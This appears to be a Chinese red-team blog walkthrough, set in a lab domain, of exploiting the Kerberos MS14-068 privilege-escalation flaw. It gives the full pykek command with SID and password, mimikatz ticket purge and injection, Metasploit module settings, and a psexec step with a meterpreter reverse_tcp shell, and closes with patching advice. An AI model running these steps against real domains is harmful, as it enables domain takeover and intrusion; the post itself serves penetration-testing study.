> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/T4HU6k10m4x5CLNuLuGrfQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **36** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

简介

Kerberos 域用户提权漏洞（MS14-068，CVE-2014-6324），所有 Windows 服务器都会收到该漏洞影响。包括 Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2。

该漏洞可导致活动目录整体权限控制收到影响，允许攻击者将域内任意用户权限提升至域管理级别。

如果攻击者获取了域内任何一台计算机的 shell 权限，同时知道任意域用户的用户名、SID、密码，即可获取域管理员权限。

漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请 TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而 KDC 在处理该票据时未验证票据的签名，那么，返给用户的 TGT 就使普通域用户拥有了域管理员权限。该用户可以将 TGT 发送到 KDC，KDC 的 TGS（票据授权服务）在验证了 TGT 后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。

**MS14-068**

**PyKEY 工具包**

PyKEY 是一个利用 Kerberos 协议进行渗透测试的工具包。

使用 PyKEY 可以生成一张高权限的服务票据，并通过 mimikatz 将服务票据注入内存。

运行环境 python2.7.

下载地址：https://github.com/mubix/pykek

#### 工具说明

ms14-068.py 是 PyKEY 工具包中的 MS14-068 漏洞利用脚本。 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxPuW4M2Q1cfYvHJCkRwKRdEwn9jNJgoj6ysSsLJ0GSagLGxJLlnQOmQ/640?wx_fmt=png)

```
-u：用户名@域名
-s：用户SID
-d：域控制器地址
-p：明文密码
--rc4：在没有明文密码的情况下，通过NTLM Hash登录
```

#### 查看域控制器的补丁安装情况

微软针对 MS14-068 漏洞提供补丁为 KB3011780。输入命令查看补丁情况：

```
wmic qfe get hotfixid
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxxYRdQSCn5SiaPU8N9eP0Oqcf3stTGFAgxNeTibmEmKLAHY8oFYpgtZng/640?wx_fmt=png)

可以看到域控机器没有安装补丁。

#### 查看用户的 SID

以用户 mary 身份登录，输入命令查看 SID 为：S-1-5-21-1218902331-2157346161-1782232778-1124

```
whoami /user
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxdtMPTKS8aKiaodR2L90tebE4CNV8LKVEMnfXHVO8DezhFkaIgtsCx3Q/640?wx_fmt=png)

还可以使用这条命令获取域内所有用户的 SID：

```
wmic useraccount get name,sid
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwBjR4Or5LNeuiamwKBEEtAUMUZJpJ6dlXs5NQ3xNTiaj2EoRqmDtUzwQ/640?wx_fmt=png)

#### 生成高权限票据

使用 PyKEY 生成高权限票据命令格式：

```
ms14-068.py -u 域成员@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码
```

域成员：mary

域名：god.org

mary 的 sid：S-1-5-21-1218902331-2157346161-1782232778-1124

域控制器地址：192.168.2.25

域成员 mary 的密码：admin!@#45

使用命令如下：

```
ms14-068.py -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.2.25 -p admin!@#45
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxUQMCRdUrxUJrBkibTapfkkxPiaMZCfZJnkvphIicmgUlOjNMbCTINjDkA/640?wx_fmt=png)

之后会在当前路径下生成一个名为 ：TGT_mary@god.org.ccache 的票据文件。

#### 查看注入前的权限

首先我们查看域控制器 C 盘的内容是看不了的：

```
dir \\OWA2010CN-God\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxiaLyfugBcn0w1Rib1k5ibJStyvuBFic5qOwEtj5iblcCE3TicbCslm8kByww/640?wx_fmt=png)

#### 清除内存中所有票据

如果目标主机上内存中有票据的话，我们需要把票据都清除：

```
kerberos::purge
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxFnybBZZ670zw4x1nJqku5CnYOCr8KSKbf0icvumyvg26UvlWpE6vkhw/640?wx_fmt=png)

#### 将高权限票据注入内存

将票据文件复制到 Mary win7 的机器下的 mimikatz 目录下，使用 mimikatz 将票据注入内存：

```
kerberos::ptc "票据文件"
kerberos::ptc "TGT_mary@god.org.ccache"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxmnJdZSbkPL5y1oLyMDGQSp9F6iawq1EPsv7bIogwiagbo30w7nbfq2ww/640?wx_fmt=png)

显示 Injecting ticket：OK ，表示注入成功！

#### 验证权限

使用 dir 列出域控制器 C 盘的内容，这个时候就可以了：

```
dir \\OWA2010CN-God\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwzBQFbLqdgUckc1HVzqHZCp6UCod0KuEHbmuHM65rtIY684ELa0Nrw/640?wx_fmt=png)

**Metasploit 中进行测试**

在 MSF 中，也有一个针对 MS14-068 漏洞利用的模块：

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxNXyF3D7eZqr8oMfrVLsJIyBbeXhjCpAQB4TVX7mMY1FDdxtewazbSw/640?wx_fmt=png)

它只需要输入域名、被提权用户的密码、被提权用户、被提权用户的 SID，域控制器的 IP：

域成员：mary

域名：god.org

mary 的 sid：S-1-5-21-1218902331-2157346161-1782232778-1124

域控制器地址：192.168.2.25

域成员 mary 的密码：admin!@#45

```
set domain god.org
set password admin!@#45
set user mary
set user_sid S-1-5-21-1218902331-2157346161-1782232778-1124
set rhosts 192.168.2.25
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxEBv8GWI2ZX0YbsJib43jGm2ZRGUic5w6uxbDyAV8o38jW205h5fYFeGQ/640?wx_fmt=png)

运行之后，会在 /root/.msf4/loot 目录下 生成文件：20201110021544_default_192.168.2.25_windows.kerberos_988070.bin

接下来要进行格式转换，在 mimikatz 中输入命令，导出 kirbi 格式的文件：

```
kerberos::clist "20201110021544_default_192.168.2.25_windows.kerberos_988070.bin" /export
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxwCzuIYUUyXm69MgbvTJqoGn3DBuNmNSL4eC4g1azpLkibGEXlqyjmRg/640?wx_fmt=png)

这个时候转换成了：0-00000000-mary@krbtgt-GOD.ORG.kirbi 文件，我移动到了 Kali 的 / root 目录下，一会好操作！

首先需要让域用户 mary win7 上线 MSF：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxNY4tSia1y3JVACMSgtjF92ymtYWibfF1SVcszMVjLz5OhNdvm1KSY6pg/640?wx_fmt=png)

输入 load kiwi 命令加载 mimikatz：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxCxkbTsA6JPg2mr1icbs6Wk3nLWQCUicic8vrLWp3B3w2GMwQHhpVib6K1A/640?wx_fmt=png)

然后输入命令导入票据：

```
kerberos_ticket_use /root/0-00000000-mary@krbtgt-GOD.ORG.kirbi
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLfUuA8geDU4PUA88ciatSqxiaSyL1C76VTxynenxLrGKVLBEMmDaHEU9Bo8hyH3uFXIAiambvNGZUIA/640?wx_fmt=png)

之后切换后台 bakcgroud ，使用模块进行高权限票据提权：

```
use exploit/windows/local/current_user_psexec
set technique PSH
set rhosts 192.168.2.24
set payload windows/meterpreter/reverse_tcp
set session 4
run
```

**防范建议**

针对 Kerberos 域用户提权漏洞：  

开启 Windows update 功能，进行自动更新

手动下载补丁包进行修复：https://technet.microsoft.com/library/security/ms14-068

对域内账号进行控制，禁止使用弱口令、定期修改密码

在服务器上安装杀毒软件，及时更新病毒库


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看